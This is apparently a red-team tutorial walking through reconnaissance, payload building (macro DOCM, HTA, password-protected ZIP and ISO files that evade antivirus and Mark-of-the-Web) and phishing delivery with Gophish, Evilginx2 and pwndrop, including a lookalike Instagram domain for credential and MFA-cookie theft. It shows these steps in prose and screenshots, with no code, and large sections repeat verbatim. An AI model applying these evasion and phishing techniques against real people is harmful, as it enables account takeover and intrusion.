This is a good approach for gathering information as we will NOT touch the target in any way such as Scanning Ports making an unusual request to the user/business to gather information.

Active:

This method is NOISY this method in approaching the target is a great method for gathering even more personal, specific, or more information about a target that is usually not found in the passive method but it's a great way to get caught.

### passive

OSINT:

Open-source intelligence (OSINT) is the collection and analysis of data gathered from open sources (Publicly available sources) to produce actionable intelligence.

In this section of OSINT we will use various methods to gather Intelligence with Open Sources (Google, Bing, Yandex) there are a few tools that can help us reach these goals. A few tools that can help us with this in Email Gathering, Phones, Names, Addresses, and the possibility of Locations.

 

The information collected in this method is only as good collected as the Operator since this section can have a plethora of information being collected and to be confirmed positive results that are real.

Some great frameworks that can be used in this approach are datasploit, SpiderFoot or Recon-ng

Example:

​

[Google Dorking](https://en.wikipedia.org/wiki/Google_hacking)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FCo28KoQZcv8nGzu9YpnS%2Fimage.png?alt=media&token=1a74cf41-4a18-46cf-bca4-c3c004bfbe91)

I used a combination of Dorks that can help me gather information, in this example it's Google.com and I am looking for specific file types PDF and in the PDF files, it needs to contain the words passwords.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FXxub5a4VaDuar3Xmyc6f%2Fimage.png?alt=media&token=abc158d8-8ea2-47c8-9433-11a243f74760)

We can tell that this PDF contains the words passwords, nothing being leaked but it gives us exactly what we were looking for and this can help to probably locate other files that are known for containing these passwords.

This method is considered 

**Passive.**

### active

The active approach moves on to touching the target environment and gathering information that can probably get us caught.

This approach is usually taken with tools, some popular ones to mention are Nmap, SpoofCheck, AQUATONE, or dnsrecon.

Example:

Tool: Nmap

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F91TmWjVZUblllZs5VpWl%2Fimage.png?alt=media&token=0aa8aef4-3914-406d-b6ee-4a0ccde6241a)

In this scenario, we managed to grab the IP of one of the corporate servers pointing out to the internet (yes, this happens) and we start port scanning with Nmap, this will leave logs on the servers that someone was trying to enumerate the machine this happens normally all over the internet usually to locate these specific enumeration tactics they will require some research to be done.

A variety of tools can achieve this, but some are more sport-specific, if we are trying to get maybe SMB enumeration then enum4linux,smbmap, etc., can be a great tool for this.

 

This method is considered 

**Active**

.

## weaponization

Weaponizing or Payload Development, it's time to build the payload that will give us a foothold on the target's network, we can use the information we have gathered from the target to help us build a payload that will work, evade defenses and give us access.

I will be speaking of the Modern Methods and Common Attachment Payloads in my examples if you would like to read more methods look for my 

[RedTeam Notes 2.0](https://dmcxblue.gitbook.io/red-team-notes-2-0/)

​

 

### macros

To start let's use the information we have gathered from our current target. So, what do we have:

OS: Windows 10 Enterprise 19043 (Windows 10 Enterprise 6.3)

Computer name: DESKTOP-ECHO

Domain name: DOMINIONCYBER.local

Also, we know that we can deliver different types of payloads to the target from the information we have gathered in our passive recon it seems that they work with PDF and DOCX Files, the SMB port is open as well as some known SMB exploits exist that can help us gain access.

The Word metadata tells us they work with a pretty old version of Office, we can probably attach an exploit to a Doc and gain access

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FW8zSwwZlBD6iWE4Q1IbF%2Fimage.png?alt=media&token=57024c91-ccb4-4fd5-a119-4ee9aaae438d)

The approach will take in weaponizing this payload will be a DOCM Document with Macro-Enabled.

I will use a personal favorite tool to create a macro-enabled payload called MacroPack will grab our VBA payload this one is built with CS

 

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FOzKshYtr3HHez9ikg70N%2Fimage.png?alt=media&token=79812dda-9ad5-4f0c-b352-f9067879b1b3)

While creating this payload I used common options and an obfuscation parameter built-in macro pack this method of weaponization is one of many I just decided to go with this approach but will leave examples of plenty of others. And with this, we have weaponized a working Macro-Enabled Document Payload

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FeodN8CHOhGnkjeW2cQtD%2Fimage.png?alt=media&token=923d065b-b3ff-4863-a4eb-c119f2162d6b)

### hta

Will use a couple of tools for weaponizing an HTA Payload.

HTA payloads are another method of attachments, but these also work better with Spearphishing via Links since we won’t be attaching a non-standard file on an email, it would stick out a file that is usually never seen by a regular everyday user (not focus on the security of course). So will be showing this via the Link method.

I created a very standard HTA Generator that will point to a PowerShell command to execute a PS1 Script via a Webserver but I will change this to execute calc only various examples and methods are all over the internet a simple google search will point you in the right 

[direction](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-link/links-hta-files)

.

I used the HTA Generator tool to create the HTA File which will open the calculator

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fr1kZexG6J980ZdjZs0W8%2Fimage.png?alt=media&token=0ce3b8d4-22c2-44aa-b06d-014ea1e48493)

Will use any phishing method to have the user Open or Save the HTA File IE is a great way to have the user open these files as it will give the option to Open directly instead of saving like other Browser but this will need thorough testing as some EDRs block because a file directly executes when downloading, suspicious right? So will continue saving the file here.

We deliver our payload with any method at our disposal in this example a benign word document containing the malicious link

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fll0mIZKZn73XuNftgSzv%2Fimage.png?alt=media&token=1c3d7064-cba4-4ad1-97fb-aaad54e42454)

User follows instruction

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FM4f10IXxL8vw3LDJ3oBv%2Fimage.png?alt=media&token=32e1cb49-f5c2-4b32-a958-71f3ac03c3e6)

The user proceeds to open the file. And we achieve execution

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FvYowmlbf6bzUeD2XSfKy%2Fimage.png?alt=media&token=68f75355-55b2-424c-a516-c2a3542a0cc7)

This method is also another way to weaponize obfuscation and encryption exist for this procedure some tools are very popular for creating these payloads sometimes the attachments of a file are completely unnecessary when sending our links, we just use this to avoid some AV scanning on the email providers. But please feel to explore and try different techniques.

 

### zip

Zip files are a popular method to deliver payloads as they are common extensions, but I think they are not normal in a work environment (Please do correct me if anything). A good reason why this file format is a great delivery method is we can have it password protected and avoid an AV to scan our malware compressed on the zip file since the AV wouldn't have the access necessary to scan the file in the interior, it’s a good method to deliver but we need to still be aware the file will be scanned again once uncompressed and executed by the user this is just a method to avoid some initial detection.

In this demonstration I will use a simple binary built with msfvenom as this tool is well known in security and AV this is a great demonstration of how zip-protected files can bypass Email Security and even AVs for delivery.

Will create the payload then deliver it to prove detection:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FQsUVKJrGF01p43uVsb7Y%2Fimage.png?alt=media&token=74d88710-cb2a-485c-a041-bb2e6da4ea93)

Now we deliver it to our target and:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FlBZtaDNfXLPLb9jitq3g%2Fimage.png?alt=media&token=69626cc4-d425-4861-a6ad-c36f4b785663)

Immediate detection will also get detected if compressed without a password, the password is the way to encrypt and avoid the AV having access to our payload so will move on to compressing the payload onto a protected ZIP file to avoid immediate detection you can use any favorite ZIP compressing tool

PASS: Evasion

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FxnJymLIga9cCNQr6qXgm%2Fimage.png?alt=media&token=2c67ebf6-33f9-424d-886d-6428dd045574)

Will deliver this new payload and we see we don't immediately get flagged we have options now:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fg78CCKJYKHuaAXxKwU5v%2Fimage.png?alt=media&token=f95f22f1-d0d5-4edf-b1ed-8f85f430b3ad)

I will save this so it can touch the disk and even prove further that the detection is still evaded

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FPd2vZ9XypZeOQvdOw3rE%2Fimage.png?alt=media&token=4ab14b38-f348-4d99-bca3-6212ce979069)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FB4Wcq2ASM8TRJbwKff3T%2Fimage.png?alt=media&token=6bdfd5cc-a2a4-4581-8cfa-2aeaf6af20bd)

We have successfully delivered our payload to the target machine, usually, only pretexts can have us move further and have the user interact with the file and have them Open the Zip, Save, Uncompressing and still execute.

 

### iso

An ISO file is an exact copy of an entire optical disk such as a CD, DVD, or Blu-Ray archived in a single file. This file, which is also sometimes referred to as an ISO image, is a smaller-sized duplicate of large sets of data.

The reason I speak of ISO files is because of a security feature called Mark-of-the-Web (MOTW) a security feature originally introduced by Internet Explorer to force saved webpages to run in the security zone of the location the paged was saved from.

​

[Nobelium](https://redmondmag.com/articles/2021/05/28/nobelium-spearphishing-attacks.aspx)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fc0IUmNrXLJwwhSOfTCow%2Fimage.png?alt=media&token=d628a3e0-f43a-473f-a65f-e6638ad5f1c8)

Since the ISO file is just a compression method for files I will show the example of grabbing a regular EXE payload and compressing this onto the ISO file will demonstrate the mark of the web avoidance, since this is helpful Microsoft doesn't check if the file comes from the Internet and we can avoid the SmartScreen protection that usually comes when a file is from the Internet.

I will show a small demonstration of why MOTW is an important factor when delivering payloads:

SmartScreen, simple this feature protects windows from files that are being downloaded from the internet when the payload is executed you will receive a warning from SmartScreen

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FUrB0VvWvhr2XEH2qegE2%2Fimage.png?alt=media&token=d5d73464-954c-4906-98c2-1d6438fe4d87)

I will follow with the execution on the payload

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F8VSJ6ODukOGUJRUD5mRW%2Fimage.png?alt=media&token=9c3649aa-e7be-44a8-8b8d-d404d5f98168)

Makes sense with the MOTW feature now let's remove it:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FyYN5kghJCwKMpzOt8gAs%2Fimage.png?alt=media&token=74a8731d-48ba-447b-a686-bc7a186c3dd8)

Immediate execution no checkups of any sort.

Will demonstrate this now by packing the payload onto an ISO file image and executing it for a reverse shell. For demo purposes we can use an amazing tool called PackMyPayload or we can take a blast to the past and use a tool called Nero

PackmyPayload:

I will fill the requirements for the tool to give us our ISO image, multiple formats are supported but I will demonstrate ISO in this example

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FiCGnUGFWm4NKtCgUofIA%2Fimage.png?alt=media&token=e8e4f997-40c8-45c3-8220-5fbcf2fff90d)

Will pack our payload

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F7sEAs9f49BkGYjm1zxk4%2Fimage.png?alt=media&token=99d88feb-2be7-4e5c-a63a-f6469619edcb)

Then send this to our user

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FIusNme2TTYujYz8D2SeU%2Fimage.png?alt=media&token=af57d741-3569-49d1-8425-a439519166e8)

Now will verify the MOTW on the ISO file

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F6E0ItlmVNgFN2rPectwt%2Fimage.png?alt=media&token=21a79d3f-baee-4d8b-829a-8b7133fa70be)

But will see that the payload in the ISO does not have the MOTW

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FwBVD7kUQY7Unl1TcKtxB%2Fimage.png?alt=media&token=30bb69ae-996a-49ff-936d-075063036fcc)

And if we try and run this, will get an immediate execution

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FuEi0eUwQUTd7lWbK7ACf%2Fimage.png?alt=media&token=a989e667-24af-4316-b40d-0b633526eeaf)

## delivery

Our method for delivering our phishing payloads this is an important step in our red team infrastructure as this is a deciding factor if our payload will be even delivered to our user, a framework that can deliver our payloads with success is a great tool fortunately also counting all the pre-steps taking in the Domain Section the majority of these are well known and open source.

### gophish

Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily set up and executes phishing engagements and security awareness training.

 

A little documentation and info on the tool

​

[https://getgophish.com/](https://getgophish.com)

Once downloaded we can proceed to unzip the file and execute the binary named gophish in the current directory in which it was downloaded

Will receive the proper information for the first-time login

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FE9sGI3s75GVYVJlHtcbF%2Fimage.png?alt=media&token=6ee9470c-b85a-4ac2-af06-d51111a2b876)

Now I will not demonstrate the complete setup of the framework as there are multiple sources and you can get more information on the Documentation page, I will demonstrate a Phishing technique and show some features of the tool.

When our framework is fully setup we can try and create a New Campaign and send our phishing emails to our targeted users

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FIww96yD2u126MW397Thl%2Fimage.png?alt=media&token=28e52772-609a-45d6-86f7-42c0ad980ef6)

Will send the Emails to our target users

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FDBQPORL4QR7l59XZFwbF%2Fimage.png?alt=media&token=45b6de25-3dee-424d-878f-22bcfea92425)

The user will check their inbox

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Ftsg5H6koILsTZldfICX5%2Fimage.png?alt=media&token=57511dbe-393d-4b33-a24e-e4cb390d603e)

This is an example utilizing the GoPhish framework, of course, a more sophisticated approach can be made by adding encryption and header information that looks a little more presentable and not spam but this was a high-level approach.

### evilginx

Evilginx2 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies which in turn allows bypassing 2-factor authentication protection

Now I won't go into a detailed explanation on setting this up as there are plenty of sources even on its Github page and I can probably be using a different VPS provider that won't match these steps, but the basic configuration is:

Will choose our phishlets I chose LinkedIn

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FUi5Mm6DD9syE976jTUjv%2Fimage.png?alt=media&token=2487d83b-fffa-45e5-9fa2-39c0e5ffac00)

Configure the domain and IP and enable the phishlet

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FbnY46G1QL1hrVf2Jzfxh%2Fimage.png?alt=media&token=f22d4937-8272-4320-822c-94b91c70d9c6)

Once set evilginx2 will create an SSL certificate utilizing Let's Encrypt if this is unsuccessful you can do this manually but from here, we can create the lures and grab the URLs needed to send to the target

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FHxtncyeqedYnslPfCyel%2Fimage.png?alt=media&token=e8af4a71-5efd-477d-b647-418143edb9e4)

When the user logs in we will capture cleartext credentials and the Cookie needed to bypass MFA Authentication

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FptIhpqGx9KVFI03Zzs5x%2Fimage.png?alt=media&token=85305f84-e751-4a67-b993-1c5f82e1d13f)

If MFA is enabled and the user logged in successfully, we will receive the Cookie as well, since this demo those not contain a legitimate user, the cookie is not demonstrated but the cleartext attempt is logged.

### pwndrop

I wanted to demonstrate this amazing tool for setting up delivery payloads with a spoofing method that can allow more legitimate-looking links for Payload deliveries as the Tool description implies it's a self-deployable file hosting service for sending out red teaming payloads or securely sharing private files over HTTP and WebDav.

Now I won’t write the setup here since it's well written and demonstrated on the Github page already.

Here is a sample of the tool functioning, will create a simple payload with msfvenom

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FbOSvEwZmIhGfxidQA6lq%2Fimage.png?alt=media&token=ca5668eb-1a6e-4ea4-a8ce-01a8f7b26674)

Now run the tool and the tool on its first execution will create a .ini file with the configurations to access the pwndrops admin panel, where the files will be stored and the admin files data.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FvfYr1gjrXhTPkKCgCcgU%2Fimage.png?alt=media&token=39dff9f4-e8e9-4beb-9dd4-f38c51d2cc01)

If anyone with incorrect information such as the wrong path they will be redirected to another page of choosing or simply a 404 error.

When uploading our payload we need 2 things the payload itself and a Facade file which we can use as a means of spoofing our original file when sending our link

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FDHbEZVABKupgeLu0iX84%2Fimage.png?alt=media&token=d053e285-7293-4f52-aaea-4dcd53737ad4)

In that manner when the target receives the link it is a spoofed linked and will be redirected to the original file that would be our payload.

A small demonstration

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FW1bYHd14exGA205oEg05%2FPWNDROP.gif?alt=media&token=2d411dd9-8d43-4825-990c-cf9eb3fd2df1)

# domain-name-and-categorization

Domains are classified using a combination of Machine Learning (ML) and human inspection. New Domains are always uncategorized and do not know how to

categorize the domains, for example when a new Domain is registered, they are usually left uncategorized and are known to be malicious, but a regular domain

such as a shopping site can be categorized correctly as a shop, e-commerce, or business site aging a site is helpful since a known malicious site is known for being "fresh" or recently purchased.

**This is a preference that just started from my personal experience, it does not need to follow these, but I've only worked with these tools, you can choose any person you want.**

**NameCheap**

:

At Namecheap, we need to change the NS servers and have them point to the AWS one and remember to categorize and age the site domain name

**Domain**

​

[http://ínstagram.com/](http://xn--nstagram-b2a.com)

 

In AWS we will need to use Route53 and Create Records to have them point to Namecheap, so the domain name shows instead of the IP

AWS: Holds a fake Instagram Webpage on an EWS Instance free, no need for more power since it can hold enough for payloads or webpages.

Certificates:

An SSL certificate is important for the website as it adds more legitimacy to the domain an option for this would be Let's Encrypt as others as well, do not limit yourself to only 1 option.

# reconnaissance

Reconnaissance is the first step into gaining access to the target for example if this is an individual target the more information we can gather about the user the better our delivery in Phishing can be, if this is corporate say then the more information we can gather in our recon we might not need the Phishing Method for Initial Access maybe there is a public exploit that help us gain access but we can also take the approach of gaining employee information and work as if it was an individual user.

There are 2 methods for gathering information Passive and Active.

Passive:

 

This is a good approach for gathering information as we will NOT touch the target in any way such as Scanning Ports making an unusual request to the user/business to gather information.

Active:

This method is NOISY this method in approaching the target is a great method for gathering even more personal, specific, or more information about a target that is usually not found in the passive method but it's a great way to get caught.

## passive

OSINT:

Open-source intelligence (OSINT) is the collection and analysis of data gathered from open sources (Publicly available sources) to produce actionable intelligence.

In this section of OSINT we will use various methods to gather Intelligence with Open Sources (Google, Bing, Yandex) there are a few tools that can help us reach these goals. A few tools that can help us with this in Email Gathering, Phones, Names, Addresses, and the possibility of Locations.

 

The information collected in this method is only as good collected as the Operator since this section can have a plethora of information being collected and to be confirmed positive results that are real.

Some great frameworks that can be used in this approach are datasploit, SpiderFoot or Recon-ng

Example:

​

[Google Dorking](https://en.wikipedia.org/wiki/Google_hacking)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FCo28KoQZcv8nGzu9YpnS%2Fimage.png?alt=media&token=1a74cf41-4a18-46cf-bca4-c3c004bfbe91)

I used a combination of Dorks that can help me gather information, in this example it's Google.com and I am looking for specific file types PDF and in the PDF files, it needs to contain the words passwords.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FXxub5a4VaDuar3Xmyc6f%2Fimage.png?alt=media&token=abc158d8-8ea2-47c8-9433-11a243f74760)

We can tell that this PDF contains the words passwords, nothing being leaked but it gives us exactly what we were looking for and this can help to probably locate other files that are known for containing these passwords.

This method is considered 

**Passive.**

## active

The active approach moves on to touching the target environment and gathering information that can probably get us caught.

This approach is usually taken with tools, some popular ones to mention are Nmap, SpoofCheck, AQUATONE, or dnsrecon.

Example:

Tool: Nmap

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F91TmWjVZUblllZs5VpWl%2Fimage.png?alt=media&token=0aa8aef4-3914-406d-b6ee-4a0ccde6241a)

In this scenario, we managed to grab the IP of one of the corporate servers pointing out to the internet (yes, this happens) and we start port scanning with Nmap, this will leave logs on the servers that someone was trying to enumerate the machine this happens normally all over the internet usually to locate these specific enumeration tactics they will require some research to be done.

A variety of tools can achieve this, but some are more sport-specific, if we are trying to get maybe SMB enumeration then enum4linux,smbmap, etc., can be a great tool for this.

 

This method is considered 

**Active**

.

# weaponization

Weaponizing or Payload Development, it's time to build the payload that will give us a foothold on the target's network, we can use the information we have gathered from the target to help us build a payload that will work, evade defenses and give us access.

I will be speaking of the Modern Methods and Common Attachment Payloads in my examples if you would like to read more methods look for my 

[RedTeam Notes 2.0](https://dmcxblue.gitbook.io/red-team-notes-2-0/)

​

 

## macros

To start let's use the information we have gathered from our current target. So, what do we have:

OS: Windows 10 Enterprise 19043 (Windows 10 Enterprise 6.3)

Computer name: DESKTOP-ECHO

Domain name: DOMINIONCYBER.local

Also, we know that we can deliver different types of payloads to the target from the information we have gathered in our passive recon it seems that they work with PDF and DOCX Files, the SMB port is open as well as some known SMB exploits exist that can help us gain access.

The Word metadata tells us they work with a pretty old version of Office, we can probably attach an exploit to a Doc and gain access

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FW8zSwwZlBD6iWE4Q1IbF%2Fimage.png?alt=media&token=57024c91-ccb4-4fd5-a119-4ee9aaae438d)

The approach will take in weaponizing this payload will be a DOCM Document with Macro-Enabled.

I will use a personal favorite tool to create a macro-enabled payload called MacroPack will grab our VBA payload this one is built with CS

 

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FOzKshYtr3HHez9ikg70N%2Fimage.png?alt=media&token=79812dda-9ad5-4f0c-b352-f9067879b1b3)

While creating this payload I used common options and an obfuscation parameter built-in macro pack this method of weaponization is one of many I just decided to go with this approach but will leave examples of plenty of others. And with this, we have weaponized a working Macro-Enabled Document Payload

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FeodN8CHOhGnkjeW2cQtD%2Fimage.png?alt=media&token=923d065b-b3ff-4863-a4eb-c119f2162d6b)

## hta

Will use a couple of tools for weaponizing an HTA Payload.

HTA payloads are another method of attachments, but these also work better with Spearphishing via Links since we won’t be attaching a non-standard file on an email, it would stick out a file that is usually never seen by a regular everyday user (not focus on the security of course). So will be showing this via the Link method.

I created a very standard HTA Generator that will point to a PowerShell command to execute a PS1 Script via a Webserver but I will change this to execute calc only various examples and methods are all over the internet a simple google search will point you in the right 

[direction](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-link/links-hta-files)

.

I used the HTA Generator tool to create the HTA File which will open the calculator

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fr1kZexG6J980ZdjZs0W8%2Fimage.png?alt=media&token=0ce3b8d4-22c2-44aa-b06d-014ea1e48493)

Will use any phishing method to have the user Open or Save the HTA File IE is a great way to have the user open these files as it will give the option to Open directly instead of saving like other Browser but this will need thorough testing as some EDRs block because a file directly executes when downloading, suspicious right? So will continue saving the file here.

We deliver our payload with any method at our disposal in this example a benign word document containing the malicious link

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fll0mIZKZn73XuNftgSzv%2Fimage.png?alt=media&token=1c3d7064-cba4-4ad1-97fb-aaad54e42454)

User follows instruction

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FM4f10IXxL8vw3LDJ3oBv%2Fimage.png?alt=media&token=32e1cb49-f5c2-4b32-a958-71f3ac03c3e6)

The user proceeds to open the file. And we achieve execution

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FvYowmlbf6bzUeD2XSfKy%2Fimage.png?alt=media&token=68f75355-55b2-424c-a516-c2a3542a0cc7)

This method is also another way to weaponize obfuscation and encryption exist for this procedure some tools are very popular for creating these payloads sometimes the attachments of a file are completely unnecessary when sending our links, we just use this to avoid some AV scanning on the email providers. But please feel to explore and try different techniques.

 

## zip

Zip files are a popular method to deliver payloads as they are common extensions, but I think they are not normal in a work environment (Please do correct me if anything). A good reason why this file format is a great delivery method is we can have it password protected and avoid an AV to scan our malware compressed on the zip file since the AV wouldn't have the access necessary to scan the file in the interior, it’s a good method to deliver but we need to still be aware the file will be scanned again once uncompressed and executed by the user this is just a method to avoid some initial detection.

In this demonstration I will use a simple binary built with msfvenom as this tool is well known in security and AV this is a great demonstration of how zip-protected files can bypass Email Security and even AVs for delivery.

Will create the payload then deliver it to prove detection:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FQsUVKJrGF01p43uVsb7Y%2Fimage.png?alt=media&token=74d88710-cb2a-485c-a041-bb2e6da4ea93)

Now we deliver it to our target and:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FlBZtaDNfXLPLb9jitq3g%2Fimage.png?alt=media&token=69626cc4-d425-4861-a6ad-c36f4b785663)

Immediate detection will also get detected if compressed without a password, the password is the way to encrypt and avoid the AV having access to our payload so will move on to compressing the payload onto a protected ZIP file to avoid immediate detection you can use any favorite ZIP compressing tool

PASS: Evasion

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FxnJymLIga9cCNQr6qXgm%2Fimage.png?alt=media&token=2c67ebf6-33f9-424d-886d-6428dd045574)

Will deliver this new payload and we see we don't immediately get flagged we have options now:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fg78CCKJYKHuaAXxKwU5v%2Fimage.png?alt=media&token=f95f22f1-d0d5-4edf-b1ed-8f85f430b3ad)

I will save this so it can touch the disk and even prove further that the detection is still evaded

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FPd2vZ9XypZeOQvdOw3rE%2Fimage.png?alt=media&token=4ab14b38-f348-4d99-bca3-6212ce979069)

